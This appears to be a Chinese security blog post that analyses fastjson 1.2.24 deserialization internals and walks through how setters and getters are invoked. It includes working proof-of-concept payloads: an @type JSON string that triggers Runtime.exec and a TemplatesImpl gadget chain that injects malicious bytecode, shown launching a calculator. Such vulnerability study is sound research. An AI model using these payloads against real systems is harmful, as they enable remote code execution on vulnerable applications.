<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br></pre></td></tr></table></figure>

<p><img src="image-20231030144038009.png" alt="image-20231030144038009"></p>
<p>跟进这个build()函数，这函数内容也非常多，不过因为两个长的 if 代码块不会运行，所以可以忽略，重点是下面的三个 for 代码块，</p>
<p><img src="image-20231030144752366.png" alt="image-20231030144752366"></p>
<p>其中第一个循环 <code>for (Method method : methods) </code> 是在指定的java类中找setter类方法。那些“函数命名以set开头，第四个字母大写”之类的条件，就是在这里进行判断处理的。</p>
<p><img src="image-20231030145529136.png" alt="image-20231030145529136"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String methodName = method.getName();</span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;   <span class="comment">//方法名长度大于4</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;      <span class="comment">//非静态方法</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// support builder set</span></span><br><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JSONField annotation = method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">    annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ordinal = annotation.ordinal();</span><br><span class="line">    serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">    parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">        String propertyName = annotation.name();</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                     annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">String propertyName;</span><br><span class="line"><span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">    || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在处理的最后，会使用add()将找到的方法加进fieldList中，（add中的FieldInfo，会涉及到下面的getonly参数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                             annotation, fieldAnnotation, <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure>

<p>第二个<code>for (Field field : clazz.getFields())</code>是遍历所有public的方法，</p>
<p>第三个与第一个类似，不过是getter方法</p>
<h3 id="getonly参数"><a href="#getonly参数" class="headerlink" title="getonly参数"></a>getonly参数</h3><p>在构造函数FieldInfo()中，有一个东西需要注意，getonly参数，如果getonly参数为false，会导致在<code>return deserializer.deserialze(this, clazz, fieldName);</code>内的调试出现问题，没办法跟踪代码，（具体是为啥不是很清楚，以后可以研究一下），需要让getonly参数为true，主要代码在FieldInfo.java中下面的代码。有两个条件，</p>
<ul>
<li>第一是代码要在走到这个FieldInfo.java中，这里需要从JavaBeanInfo.java中的<code>add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</code>进去，</li>
<li>第二个是这里的第二个if ((types = method.getParameterTypes()).length == 1) </li>
</ul>
<p><img src="image-20240306171632737.png" alt="image-20240306171632737"></p>
<p>为了后续方便调试，这个参数需要为true，在FieldInfo()中，这个参数为true，需要 method.getParameterTypes()的长度不为1，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((types = method.getParameterTypes()).length == <span class="number">1</span>) </span><br></pre></td></tr></table></figure>

<p>然而在第一个for (Method method : methods) 循环中，有这样一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在第一个for循环中，是永远不能使getonly为true的。因为如果参数不为1,那就会被continue，代码根本走不到add()；如果参数为1,代码在走到了add(),那getonly就只能为false了。</p>
<p>所以需要看第二个for循环。</p>
<p>第二个for循环是找getter函数，构造的函数需要满足以下几个条件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数名大于4</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数不能是静态方法 static</span></span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;    </span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数需要以get开头，且第四个字符是大写</span></span><br><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;  	</span><br><span class="line">     <span class="comment">//函数不能有入参</span></span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;       </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 函数返回值需要是以下几种类型 Collection,Map,AtomicBoolean,AtomicInteger,AtomicLong</span></span><br><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//    </span></span><br><span class="line">    || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">    || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">) &#123;</span><br><span class="line">    …………</span><br><span class="line"><span class="comment">// fieldList中没有setter方法，简单说就是，如果getKey要满足条件，就不能出现满足条件的setKey</span></span><br><span class="line">    FieldInfo fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	…………</span><br><span class="line"> 	add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, <span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="keyword">null</span>, <span class="keyword">null</span>));</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以为了将getonly变量为true，所需要构造的getter函数就可以简单写为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> AtomicBoolean <span class="title">getKey2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        Collection&lt;String&gt; re = null;</span></span><br><span class="line"><span class="comment">//        Map&lt;String,String&gt; re = null;</span></span><br><span class="line">        AtomicBoolean re = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//        AtomicInteger re = null;</span></span><br><span class="line"><span class="comment">//        AtomicLong re = null;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">        <span class="keyword">return</span> re;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231031130900988.png" alt="image-20231031130900988"></p>
<p>之后，代码跳出<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code> 向下走到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    …………</span><br><span class="line">&#125;</span><br><span class="line">…………</span><br><span class="line"><span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以将asmEnable设置为false，随后<code> return new JavaBeanDeserializer(this, clazz, type);</code> 结束函数。</p>
<p>在return的时候，是new了一个新的JavaBeanDeserializer，所以还会在走一边之前的三个for循环那块的流程，然后退出到ParseConfig.java的<code>derializer = createJavaBeanDeserializer(clazz, type);</code>，再继续退出当前的getDeserializer()函数，回到getDeserializer()，最后退出到DefaultJSONParser.java的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>通过调整getter函数，使用<code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>获取到反序列化器后</p>
<p><del>退出到DefaultJSONParser.java的<code>return deserializer.deserialze(this, clazz, fieldName);</code>后，</del></p>
<p>跟进deserialze()方法，跳过一些重载方法后，来到JavaBeanDeserializer.java文件中。走到<code>object = createInstance(parser, type);</code>时。这里是新建一个实例，在这里面有一句<code>object = constructor.newInstance();</code>会执行指定了类的构造方法</p>
<p><img src="image-20231031161055222.png" alt="image-20231031161055222"></p>
<p><img src="image-20231031161113880.png" alt="image-20231031161113880"></p>
<p>之后在<code>fieldDeser.setValue(object, fieldValue);</code>中跟进，里面在经过层层if判断和其他的处理后，有一行反射代码<code>method.invoke(object, value);</code></p>
<p>在这执行了之前加入到fieldList的setter函数，</p>
<p>这里是setName</p>
<p><img src="image-20231031162125277.png" alt="image-20231031162125277"></p>
<p><img src="image-20231031162213983.png" alt="image-20231031162213983"></p>
<p>而被执行的getter方法，是在JSON.java的<code>return (JSONObject) JSON.toJSON(obj);</code>中被调用的，在使用parse()将字符串反序列化为对象后，判断对象类型是否是JSON，如果不是，就再使用toJSON()函数处理一下obj。</p>
<p><img src="image-20231031162843403.png" alt="image-20231031162843403"></p>
<p><img src="image-20231031163027896.png" alt="image-20231031163027896"></p>
<p>在toJSON中，通过<code>ObjectSerializer serializer = config.getObjectWriter(clazz);</code>获取ObjectSerializer：</p>
<p><img src="image-20231031170454368.png" alt="image-20231031170454368"></p>
<p><img src="image-20231031170522391.png" alt="image-20231031170522391"></p>
<p><img src="image-20231031170543611.png" alt="image-20231031170543611"></p>
<p><img src="image-20231031170617489.png" alt="image-20231031170617489"></p>
<p><img src="image-20231031170719435.png" alt="image-20231031170719435"></p>
<p>在获取到ObjectSerializer后，在<code>Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);</code>里面执行的getter方法，具体来看：</p>
<p>getFieldValuesMap() –&gt;  getter.getPropertyValue(object)  -&gt;  Object propertyValue =  fieldInfo.get(object);</p>
<p><img src="image-20231031171652499.png" alt="image-20231031171652499"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object javaObject)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object value = method.invoke(javaObject, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试执行命令"><a href="#测试执行命令" class="headerlink" title="测试执行命令"></a>测试执行命令</h3><p>假如说在代码中有一个这样的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testcmd</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要通过fastjson执行命令，可以这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void test7()&#123;</span><br><span class="line">    String cmd &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.testcmd\&quot;,\&quot;cmd\&quot;:\&quot;gnome-calculator\&quot;&#125;&quot;;</span><br><span class="line">    Object P2 &#x3D; JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231101095633776.png" alt="image-20231101095633776"></p>
<h2 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h2><p>对于java版本</p>
<p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
<p>LADP利用JDK版本≤ 6u211 、7u201、8u191</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>环境</p>
<ul>
<li>ubuntu 22.04</li>
<li>java version “1.8.0_102”</li>
</ul>
<p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span>   <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl</span></span><br><span class="line">        <span class="comment">// 生成 evilcode</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;gnome-calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;akka1&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        System.out.println(evilCode_base64);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造payload</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        System.out.println(<span class="string">&quot;payload:&quot;</span>+payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行</span></span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20240308153958617.png" alt="image-20240308153958617"></p>
<p>首先该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。如下：</p>
<p><img src="image-20240311085936297.png" alt="image-20240311085936297"></p>
<p><img src="image-20240311085953511.png" alt="image-20240311085953511"></p>
<p>往回找，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。</p>
<p>getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance()</p>
<p>而 <code>getOutputProperties()</code> 方法就是类成员变量 <code>_outputProperties</code> 的 getter 方法。所以在使用fastjson反序列化时，如果设置了 <code>_outputProperties</code> 变量，就能在反序列化的过程中执行<code>getOutputProperties()</code>方法。</p>
<p><img src="image-20240311090549219.png" alt="image-20240311090549219"></p>
<p>现在需要知道这个 <code>_class[_transletIndex]</code>是否能由用户控制，<code>_transletIndex</code>也是一个变量，初始值为-1。</p>
<p><img src="image-20240311105310519.png" alt="image-20240311105310519"></p>
<p>ctrl+左键查找一下<code>_class</code>，发现在<code>TemplatesImpl()、readObject()、defineTransletClasses()</code>中都有赋值的操作。</p>
<p><img src="image-20240311091814919.png" alt="image-20240311091814919"></p>
<p>其中 <code>defineTransletClasses()</code> 在 <code>getTransletInstance()</code> 中，如果 <code>_class</code> 为空即会被调用，看一下 <code>defineTransletClasses()</code> 的逻辑</p>
<p><img src="image-20240311104717731.png" alt="image-20240311104717731"></p>
<p><img src="image-20240311104837084.png" alt="image-20240311104837084"></p>
<p>首先需要_bytecodes不为空，不然会报错结束这个方法。然后会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> 。而 <code>_bytecodes</code> 也是该类的成员属性。</p>
<p>在for循环中的if判断是为了判断这个类的父类是否为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。如果是，就会将类成员属性的<code>_transletIndex</code> 设置为当前循环中的标记位，比如说_bytecodes这个列表里面只有一个元素，此时for循环i=0,如果父类为 <code>ABSTRACT_TRANSLET</code> ，则<code>_transletIndex</code> 就为0。</p>
<p>另外，<code>_bytecodes</code>和<code>_name</code>都是没有setter方法的私有变量，所以想要在反序列化的时候为这两个变量赋值，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；关于私有属性赋值的细节，我放在后面写一下。</p>
<p>整个利用链为：</p>
<ul>
<li>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类需要是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。</li>
<li>在反序列化过程中，由于getter方法 <code>getOutputProperties()</code>，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
</ul>
<h4 id="bytecodes私有属性的赋值"><a href="#bytecodes私有属性的赋值" class="headerlink" title="_bytecodes私有属性的赋值"></a>_bytecodes私有属性的赋值</h4><p>fastjson在反序列化字符串的时候，<br>1.如果变量是public，不需要setter类方法，字符串里写了，就能反序列化进去，<br>2.如果变量是private，需要有setter类方法才能反序列化进去，<br>3.如果变量是private，没有setter类方法。需要设置Feature.SupportNonPublicField才能能反序列化进去。</p>
<p>先准备这样一个类</p>
<p>user4.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key1;</span><br><span class="line">    <span class="keyword">private</span> String key2;</span><br><span class="line">    <span class="keyword">private</span> String _key3;</span><br><span class="line">    <span class="keyword">public</span> String _key4;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey1</span><span class="params">(String key1)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey2</span><span class="params">(String key2)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">(String key1,String key2)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;key1=&#x27;&quot;</span> + key1 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key2=&#x27;&quot;</span> + key2 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key3=&#x27;&quot;</span> + _key3 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key4=&#x27;&quot;</span> + _key4 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是poc代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test13</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user4\&quot;,\&quot;key1\&quot;:\&quot;key11\&quot;,\&quot;key2\&quot;:\&quot;key22\&quot;,\&quot;_key3\&quot;:\&quot;key33\&quot;,\&quot;_key4\&quot;:\&quot;key44\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line"><span class="comment">//        Object P1 = JSON.parse(p1,Feature.SupportNonPublicField);</span></span><br><span class="line">        Object P1 = JSON.parse(p1);</span><br><span class="line">        System.out.println(<span class="string">&quot;===&gt; &quot;</span>+P1.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20240312155625896.png" alt="image-20240312155625896"><img src="image-20240312155647214.png" alt="image-20240312155647214"></p>
